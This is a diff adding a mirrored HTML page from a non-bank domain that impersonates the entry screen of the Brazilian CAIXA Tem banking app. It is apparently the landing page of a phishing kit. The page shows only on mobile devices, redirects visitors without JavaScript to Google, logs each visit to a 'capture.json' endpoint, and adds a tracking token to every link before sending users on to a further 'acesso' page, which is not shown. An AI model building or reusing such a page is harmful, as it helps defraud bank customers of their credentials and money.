@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<!-- Mirrored from caixa.telatest21.uk/?a7k9m2x1p12 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 May 2026 14:39:29 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <link rel="icon" type="image/png" href="favicon.png" />
+  <title>CAIXA TEM - ACESSE SUA CONTA</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(to bottom, rgba(0, 102, 179, 0.7) 0%, rgba(0, 102, 179, 0.3) 50%, rgba(0, 102, 179, 0) 100%), url('bkindex3.png') no-repeat center top;
+      background-size: cover;
+      height: 100vh;
+      width: 100vw;
+      position: fixed;
+      overflow: hidden;
+      display: none; /* Hidden by default (desktop) */
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+    }
+
+    /* Show only on mobile devices */
+    @media (max-width: 768px) {
+      body {
+        display: flex;
+      }
+    }
+
+    .logo-container {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 40px;
+    }
+
+    .logo-container img {
+      max-width: 280px;
+      width: 90%;
+      height: auto;
+    }
+
+    .button-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 0 20px;
+    }
+
+    .enter-btn {
+      width: 100%;
+      padding: 18px;
+      background: #f59e0b;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: 700;
+      cursor: pointer;
+      text-decoration: none;
+      display: block;
+      text-align: center;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      margin-bottom: 20px;
+    }
+
+    .enter-btn:active {
+      transform: scale(0.98);
+    }
+
+    .help-link {
+      color: white;
+      text-decoration: none;
+      font-size: 16px;
+      font-weight: 500;
+      display: block;
+      text-align: center;
+      margin-bottom: 60px;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 30px;
+      gap: 10px;
+    }
+
+    .checkbox-container input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+      cursor: pointer;
+      accent-color: white;
+    }
+
+    .checkbox-container label {
+      color: white;
+      font-size: 14px;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .version {
+      text-align: center;
+      color: rgba(255, 255, 255, 0.7);
+      font-size: 14px;
+      padding-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="logo-container">
+    <!-- Logo movido para o rodapé -->
+  </div>
+
+  <div class="button-container">
+    <a href="acesso4e98.html?a7k9m2x1p12" class="enter-btn">
+      Entrar no CAIXA Tem
+    </a>
+
+    <a href="#" class="help-link">Preciso de ajuda</a>
+
+    <div class="checkbox-container">
+      <input type="checkbox" id="dontShowAgain" />
+      <label for="dontShowAgain">Não mostrar novamente</label>
+    </div>
+  </div>
+
+  <div class="version">
+    <img src="logocaixaindex.png" alt="CAIXA tem!" style="max-width: 200px; width: 80%; height: auto;" />
+  </div>
+
+  <script>
+    // Log visit
+    fetch('capture.json', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ step: 'visit', page: 'index' })
+    });
+  </script>
+<noscript><meta http-equiv="refresh" content="0;url=https://google.com/"></noscript>
+    <script>
+    // Manter parâmetro de acesso em todos os links e formulários
+    document.addEventListener('DOMContentLoaded', function() {
+        var accessParam = 'a7k9m2x1p12';
+        
+        function addAccessToLinks() {
+            var links = document.querySelectorAll('a[href]');
+            
+            links.forEach(function(link) {
+                var href = link.getAttribute('href');
+                
+                // Pular links externos, âncoras, javascript: ou que já têm o parâmetro
+                if (!href || href.startsWith('http') || href.startsWith('#') || 
+                    href.startsWith('javascript:') || href.includes(accessParam.split('=')[0])) {
+                    return;
+                }
+                
+                var separator = href.includes('?') ? '&' : '?';
+                link.setAttribute('href', href + separator + accessParam);
+            });
+        }
+        
+        function addAccessToForms() {
+            var forms = document.querySelectorAll('form');
+            forms.forEach(function(form) {
+                // Adicionar para formulários GET
+                if (!form.method || form.method.toLowerCase() === 'get') {
+                    var paramName = accessParam.split('=')[0];
+                    
+                    // Verificar se já existe o campo
+                    var existingInput = form.querySelector('input[name="' + paramName + '"]');
+                    if (!existingInput) {
+                        var input = document.createElement('input');
+                        input.type = 'hidden';
+                        input.name = paramName;
+                        input.value = '';
+                        form.appendChild(input);
+                    }
+                }
+            });
+        }
+        
+        // Executar inicialmente
+        addAccessToLinks();
+        addAccessToForms();
+        
+        // Observar mudanças no DOM para links/formulários adicionados dinamicamente
+        var observer = new MutationObserver(function(mutations) {
+            var shouldUpdate = false;
+            mutations.forEach(function(mutation) {
+                if (mutation.type === 'childList') {
+                    mutation.addedNodes.forEach(function(node) {
+                        if (node.nodeType === 1) { // Element node
+                            if (node.tagName === 'A' || node.tagName === 'FORM' || 
+                                node.querySelector('a') || node.querySelector('form')) {
+                                shouldUpdate = true;
+                            }
+                        }
+                    });
+                }
+            });
+            
+            if (shouldUpdate) {
+                addAccessToLinks();
+                addAccessToForms();
+            }
+        });
+        
+        observer.observe(document.body, {
+            childList: true,
+            subtree: true
+        });
+    });
+    </script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"7b0212d8e6ce4101ace06afa40e5bdff","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+
+<!-- Mirrored from caixa.telatest21.uk/?a7k9m2x1p12 by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 12 May 2026 14:39:34 GMT -->
+</html>
